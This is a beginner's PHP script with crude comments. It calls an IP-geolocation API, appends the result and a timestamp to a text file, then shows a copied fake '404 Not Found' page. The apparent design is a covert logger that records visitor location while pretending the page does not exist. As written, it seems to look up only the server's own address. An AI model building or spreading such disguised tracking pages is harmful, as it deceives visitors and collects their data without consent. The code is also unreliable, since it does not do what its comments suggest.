<?php

// jhelloo fututure sakml

//Okay, so first time using php.

// initialize curl(what is curl? don't even know but I know it allows me to process data from an api)
$ch = curl_init();
$url = "http://ip-api.com/json/";

//gets the url to fetch
//^ note this can be set during initialization
curl_setopt($ch, CURLOPT_URL, $url);
//setting this true returns a string instead of outputting as an object(grrr fuck objects grrr)
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

//actually exectuting it shit cuh
$resp = curl_exec($ch);

//catches error and returns it( probably should remove if I actually use logger )
if($e = curl_error($ch)) {
    echo $e;
}
else {
    //if no error- set user_info to response
    $user_info = $resp;
}
//ALWAYS close curl!111
curl_close($ch);

//literally just the date
$user_clickdate = date('d-m-Y H:i:s') . "\r\n";

//opens our txt file
$stockInfo = fopen('info.txt', 'a+');

//fput means file put, so each line here is me writing to the txt file
fputs($stockInfo, $user_info);
fputs($stockInfo,"\n" . '-DATE-' . "\r\n");
fputs($stockInfo, $user_clickdate);
fputs($stockInfo,"\n" . '-----------------' . "\r\n");
//closes file
fclose($stockInfo);
?>

<!-- stolen 404 page -->
<!DOCTYPE html>
<html lang="en"> 

<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>404 Not Found</title>
    <style type="text/css">
    .page {
        display: -webkit-box;
        display: -ms-flexbox;
        display: flex;
        min-height: 100vh;
    }

    .main {
        -webkit-box-flex: 1;
        -ms-flex: 1 1 70%;
        flex: 1 1 70%;
        box-sizing: border-box;
        padding: 10rem 5rem 5rem;
        min-height: 100vh;
    }

    .error-code {
        color: #f47755;
        font-size: 8rem;
        line-height: 1;
    }

    p.lead {
        font-size: 1.6rem;
        color: #4f5a64;
    }
    </style>
</head>

<body>
    

    <div class="page">
        <div class="main">
            <h1>Server Error</h1>
            <div class="error-code">404</div>
            <h2>Page Not Found</h2>
            <p class="lead">This page either doesn't exist, or it moved somewhere else.</p>
            <hr />
        </div>
</body>